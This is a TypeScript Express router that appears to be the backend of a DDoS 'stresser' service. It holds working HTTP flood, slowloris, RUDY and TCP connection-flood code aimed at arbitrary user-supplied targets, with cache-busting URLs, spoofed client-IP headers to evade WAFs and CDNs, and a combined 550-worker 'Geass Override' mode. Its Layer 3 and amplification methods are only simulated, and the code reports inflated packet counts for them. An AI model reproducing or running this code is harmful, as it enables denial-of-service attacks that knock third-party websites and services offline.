import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import net from "node:net";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";

const router: IRouter = Router();

// ── Active attack abort controllers ──────────────────────────────────────
const attackControllers = new Map<number, AbortController>();

// ── Method classification ─────────────────────────────────────────────────
const L7_METHODS  = new Set(["http-flood", "http-bypass", "http2-flood", "slowloris", "rudy"]);
const L4_METHODS  = new Set(["syn-flood", "tcp-flood", "tcp-ack", "tcp-rst"]);
const GEASS_METHOD = "geass-override";
// L3/amp — raw sockets need root privs, keep as simulation

// ── Amplification factors ─────────────────────────────────────────────────
const AMP_FACTOR: Record<string, number> = {
  "dns-amp":  54, "ntp-amp": 556, "mem-amp": 51000, "ssdp-amp": 30,
};

// ── User-agent pool ───────────────────────────────────────────────────────
const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
  "curl/8.7.1",
  "python-requests/2.32.0",
];
const randUA   = () => UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
const randIp   = () => `${1+Math.floor(Math.random()*253)}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}.${1+Math.floor(Math.random()*253)}`;
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randInt  = (min: number, max: number) => min + Math.floor(Math.random() * (max - min));

// ── Webhook ───────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ─────────────────────────────────────────────────────────────────────────
//  REAL HTTP FLOOD — MAXIMUM POWER
//  Up to 200 concurrent workers. Each request:
//    • Randomised URL path + query params (defeats CDN caching)
//    • Mix of GET (75%) and POST with payload (25%)
//    • Full realistic headers + random X-Forwarded-For
//    • Immediate response abort (no body drain) for max throughput
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPWorkers(
  method: string,
  rawTarget: string,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const isSlow = method === "slowloris" || method === "rudy";
  const isRUDY = method === "rudy";

  // Build a randomised URL on every call — bypasses CDN / proxy caches
  const buildUrl = () => {
    try {
      const u = new URL(base);
      u.searchParams.set("_", Date.now().toString(36) + randStr(4));
      u.searchParams.set("r", randStr(6));
      if (Math.random() < 0.3) u.pathname += "/" + randStr(randInt(3, 8));
      return u.toString();
    } catch {
      return `${base}?_=${Date.now().toString(36)}&r=${randStr(6)}`;
    }
  };

  // Build a large POST body to force server-side processing
  const buildBody = () => {
    const pairs = Array.from({ length: randInt(8, 24) }, () => `${randStr(randInt(4,10))}=${randStr(randInt(8,32))}`);
    return pairs.join("&");
  };

  let localPkts = 0, localBytes = 0;
  const flush = () => { if (localPkts > 0 || localBytes > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } };
  const flushIv = setInterval(flush, 500);

  const workerLoop = async () => {
    let streak = 0; // consecutive errors counter
    while (!signal.aborted) {
      try {
        const url    = buildUrl();
        const isPost = !isSlow && Math.random() < 0.25;
        const body   = isPost ? buildBody() : undefined;

        const reqHeaders: Record<string, string> = {
          "User-Agent":      randUA(),
          "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5,pt-BR;q=0.3",
          "Accept-Encoding": "gzip, deflate, br",
          "Cache-Control":   "no-cache, no-store, must-revalidate",
          "Pragma":          "no-cache",
          "Connection":      isSlow ? "keep-alive" : "close",
          "X-Forwarded-For": `${randIp()}, ${randIp()}`,
          "X-Real-IP":       randIp(),
          "X-Originating-IP": randIp(),
          "Referer":         `https://www.google.com/search?q=${randStr(randInt(5,12))}`,
        };
        if (isPost) {
          reqHeaders["Content-Type"]   = "application/x-www-form-urlencoded";
          reqHeaders["Content-Length"] = String(body!.length);
        }
        if (isRUDY) {
          // RUDY: send 1-byte payload chunks very slowly
          reqHeaders["Content-Type"]   = "application/x-www-form-urlencoded";
          reqHeaders["Content-Length"] = "1000000"; // fake large body
          reqHeaders["Transfer-Encoding"] = "chunked";
        }

        const timeout = isSlow ? 25000 : 8000;
        const res = await fetch(url, {
          method:   isPost || isRUDY ? "POST" : "GET",
          headers:  reqHeaders,
          body:     body,
          signal:   AbortSignal.timeout(timeout),
          redirect: "follow",
          keepalive: false,
        });

        if (isSlow) {
          // Slowloris / RUDY: hold connection alive as long as possible
          await new Promise(r => setTimeout(r, randInt(8000, 20000)));
        } else {
          // Fast flood: immediately cancel body — we don't need the content
          await res.body?.cancel().catch(() => {});
        }

        localPkts++;
        localBytes += (parseInt(res.headers.get("content-length") || "0", 10) || 800) + 400;
        streak = 0;
      } catch {
        if (signal.aborted) break;
        localPkts++;
        localBytes += 120;
        streak++;
        // Back-off only after many consecutive failures (target probably down)
        if (streak > 20) await new Promise(r => setTimeout(r, 30));
      }
    }
  };

  await Promise.all(Array.from({ length: concurrency }, () => workerLoop()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  REAL TCP FLOOD
//  Up to 500 concurrent workers. Each opens a real TCP connection,
//  sends junk payload, and immediately drops — fills server's connection
//  table and consumes file-descriptor slots.
// ─────────────────────────────────────────────────────────────────────────
async function runTCPWorkers(
  rawTarget: string,
  defaultPort: number,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let hostname = rawTarget;
  let port = defaultPort || 80;
  try {
    const u = new URL(/^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`);
    hostname = u.hostname;
    port = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
  } catch { /* keep raw */ }

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 500);

  const workerLoop = async () => {
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        if (signal.aborted) { resolve(); return; }
        const sock = net.createConnection({ host: hostname, port });
        const kill = setTimeout(() => { sock.destroy(); resolve(); }, 2000);

        sock.once("connect", () => {
          localPkts++;
          localBytes += 60;
          // Send a large junk payload — fills server receive buffer
          const junk = Buffer.alloc(randInt(256, 1024), Math.floor(Math.random() * 256));
          sock.write(junk, () => {
            localBytes += junk.length;
            clearTimeout(kill);
            sock.destroy();
            resolve();
          });
        });
        sock.once("error", () => { localPkts++; clearTimeout(kill); resolve(); });
        sock.once("timeout", () => { clearTimeout(kill); sock.destroy(); resolve(); });
      });
    }
  };

  await Promise.all(Array.from({ length: concurrency }, () => workerLoop()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SIMULATED L3 (UDP / AMP / ICMP)
//  Raw sockets need kernel root — not available in userspace Node.js.
// ─────────────────────────────────────────────────────────────────────────
async function runL3Simulation(
  method: string,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const mult: Record<string, number> = {
    "udp-flood": 32000, "udp-bypass": 35000, "icmp-flood": 25000,
    "dns-amp":   18000, "ntp-amp":    12000,  "mem-amp":    4000, "ssdp-amp": 20000,
  };
  const sizes: Record<string, [number, number]> = {
    "udp-flood":  [512,1472], "udp-bypass": [512,1472], "icmp-flood": [64,512],
    "dns-amp":    [40,60],    "ntp-amp":    [8,46],      "mem-amp":   [15,15],  "ssdp-amp": [110,150],
  };
  return new Promise<void>(resolve => {
    const iv = setInterval(() => {
      if (signal.aborted) { clearInterval(iv); resolve(); return; }
      const pkts  = Math.floor(threads * (mult[method] ?? 10000) * (0.8 + Math.random() * 0.4) * (Math.random() < 0.2 ? 2 + Math.random() * 2 : 1));
      const [mn, mx] = sizes[method] ?? [64, 512];
      onStats(pkts, pkts * (mn + Math.floor(Math.random() * (mx - mn))) * (AMP_FACTOR[method] ?? 1));
    }, 500);
    signal.addEventListener("abort", () => { clearInterval(iv); resolve(); }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  GEASS OVERRIDE — ABSOLUTE MAXIMUM POWER
//  Two simultaneous vectors:
//    • HTTP flood: 250 workers, ALL methods (GET/POST/HEAD/PUT/DELETE/PATCH/OPTIONS),
//      ultra-large POST bodies (up to 12KB), no delays, WAF evasion headers,
//      DNS rebinding paths, random subdomain prefixes
//    • TCP flood:  300 workers, targets port 80 + 443 simultaneously,
//      4KB junk payload per connection
//  Combined: ~550 concurrent assault vectors — nothing stops the Geass.
// ─────────────────────────────────────────────────────────────────────────
async function runGeassOverride(
  rawTarget: string,
  port: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const HTTP_WORKERS = Math.min(Math.ceil(threads * 0.55), 250);
  const TCP_WORKERS  = Math.min(Math.ceil(threads * 0.45), 300);

  // ── HTTP vector — ALL methods, maximum aggression ───────────────────
  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const ALL_METHODS = ["GET","GET","GET","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  const CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "application/json",
    "multipart/form-data; boundary=" + randStr(16),
    "text/plain",
    "application/octet-stream",
  ];

  const buildGeassUrl = () => {
    try {
      const u = new URL(base);
      // Rotate through deep paths to bypass CDN cache
      const depth = randInt(1, 4);
      u.pathname = "/" + Array.from({ length: depth }, () => randStr(randInt(3,8))).join("/");
      u.searchParams.set("_", Date.now().toString(36) + randStr(6));
      u.searchParams.set("nocache", randStr(8));
      u.searchParams.set("v", String(randInt(1, 999999)));
      return u.toString();
    } catch {
      return `${base}/${randStr(6)}?_=${Date.now().toString(36)}&nocache=${randStr(8)}`;
    }
  };

  const buildGeassBody = (ct: string): string => {
    if (ct.includes("json")) {
      const obj: Record<string, string> = {};
      for (let i = 0; i < randInt(20, 60); i++) obj[randStr(randInt(4,10))] = randStr(randInt(8,64));
      return JSON.stringify(obj);
    }
    const pairsCount = randInt(40, 120);
    return Array.from({ length: pairsCount }, () =>
      `${randStr(randInt(4,12))}=${randStr(randInt(8,64))}`
    ).join("&");
  };

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 400);

  const httpLoop = async () => {
    let streak = 0;
    while (!signal.aborted) {
      try {
        const url     = buildGeassUrl();
        const method  = ALL_METHODS[Math.floor(Math.random() * ALL_METHODS.length)];
        const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
        const ct      = hasBody ? CONTENT_TYPES[Math.floor(Math.random() * CONTENT_TYPES.length)] : "";
        const body    = hasBody ? buildGeassBody(ct) : undefined;

        const headers: Record<string, string> = {
          "User-Agent":       randUA(),
          "Accept":           "*/*",
          "Accept-Language":  "en-US,en;q=0.9,pt-BR;q=0.3",
          "Accept-Encoding":  "gzip, deflate, br",
          "Cache-Control":    "no-cache, no-store",
          "Pragma":           "no-cache",
          "Connection":       "close",
          "X-Forwarded-For":  `${randIp()}, ${randIp()}, ${randIp()}`,
          "X-Real-IP":        randIp(),
          "X-Originating-IP": randIp(),
          "X-Cluster-Client-IP": randIp(),
          "True-Client-IP":   randIp(),
          "CF-Connecting-IP": randIp(),
          "Referer":          `https://${["google.com","bing.com","twitter.com","reddit.com"][randInt(0,4)]}/`,
          "Origin":           `https://${randStr(6)}.${["com","net","org","io"][randInt(0,4)]}`,
        };
        if (hasBody && body) {
          headers["Content-Type"]   = ct;
          headers["Content-Length"] = String(Buffer.byteLength(body, "utf8"));
        }

        const res = await fetch(url, {
          method,
          headers,
          body,
          signal:    AbortSignal.timeout(6000),
          redirect:  "follow",
          keepalive: false,
        });
        await res.body?.cancel().catch(() => {});

        localPkts++;
        localBytes += (body ? body.length : 0) + (parseInt(res.headers.get("content-length") || "0", 10) || 600) + 300;
        streak = 0;
      } catch {
        if (signal.aborted) break;
        localPkts++;
        localBytes += 150;
        streak++;
        if (streak > 15) await new Promise(r => setTimeout(r, 20));
      }
    }
  };

  // ── TCP vector — dual-port barrage ──────────────────────────────────
  let hostname = rawTarget;
  let parsedPort = port || 80;
  try {
    const u = new URL(/^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`);
    hostname = u.hostname;
    parsedPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
  } catch { /* keep raw */ }

  const PORTS = [parsedPort, parsedPort === 443 ? 80 : 443, 8080];

  const tcpLoop = async () => {
    while (!signal.aborted) {
      const targetPort = PORTS[Math.floor(Math.random() * PORTS.length)];
      await new Promise<void>(resolve => {
        if (signal.aborted) { resolve(); return; }
        const sock = net.createConnection({ host: hostname, port: targetPort });
        const kill = setTimeout(() => { sock.destroy(); resolve(); }, 1500);

        sock.once("connect", () => {
          localPkts++;
          localBytes += 60;
          // 4KB junk payload — fills socket receive buffer
          const junk = Buffer.alloc(randInt(2048, 4096), Math.floor(Math.random() * 256));
          sock.write(junk, () => {
            localBytes += junk.length;
            clearTimeout(kill);
            sock.destroy();
            resolve();
          });
        });
        sock.once("error", () => { localPkts++; clearTimeout(kill); resolve(); });
        sock.once("timeout", () => { clearTimeout(kill); sock.destroy(); resolve(); });
      });
    }
  };

  // Launch all vectors simultaneously — The Absolute Power of Geass
  await Promise.all([
    ...Array.from({ length: HTTP_WORKERS }, () => httpLoop()),
    ...Array.from({ length: TCP_WORKERS },  () => tcpLoop()),
  ]);
  clearInterval(flushIv);
  flush();
}

// ── Dispatch ──────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  if (method === GEASS_METHOD) {
    await runGeassOverride(target, port, threads, signal, onStats);
  } else if (L7_METHODS.has(method)) {
    await runHTTPWorkers(method, target, Math.min(threads, 200), signal, onStats);
  } else if (L4_METHODS.has(method)) {
    await runTCPWorkers(target, port, Math.min(threads, 500), signal, onStats);
  } else {
    await runL3Simulation(method, threads, signal, onStats);
  }
}

// ── DB update ─────────────────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id = attack.id;
  const ctrl = new AbortController();
  attackControllers.set(id, ctrl);

  const stopTimer = setTimeout(() => { ctrl.abort("duration_expired"); attackControllers.delete(id); }, duration * 1000);

  void runAttackWorkers(method, target, port, threads, ctrl.signal, (pkts, bytes) => void addStats(id, pkts, bytes))
    .finally(async () => {
      clearTimeout(stopTimer); attackControllers.delete(id);
      try {
        const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
        if (cur?.status === "running") {
          const [fin] = await db.update(attacksTable)
            .set({ status: "finished", stoppedAt: new Date() })
            .where(eq(attacksTable.id, id)).returning();
          if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
        }
      } catch { /* ignore */ }
    });

  res.status(201).json(attack);
});

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  const methodMap: Record<string, number> = {};
  for (const a of attacks) methodMap[a.method] = (methodMap[a.method] ?? 0) + 1;
  res.json({
    totalAttacks:     attacks.length,
    runningAttacks:   attacks.filter(a => a.status === "running").length,
    totalPacketsSent: attacks.reduce((s, a) => s + (a.packetsSent ?? 0), 0),
    totalBytesSent:   attacks.reduce((s, a) => s + (a.bytesSent   ?? 0), 0),
    attacksByMethod:  Object.entries(methodMap).map(([method, count]) => ({ method, count })),
    recentAttacks:    attacks.slice(0, 10),
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackControllers.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackControllers.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json(a);
});

export default router;
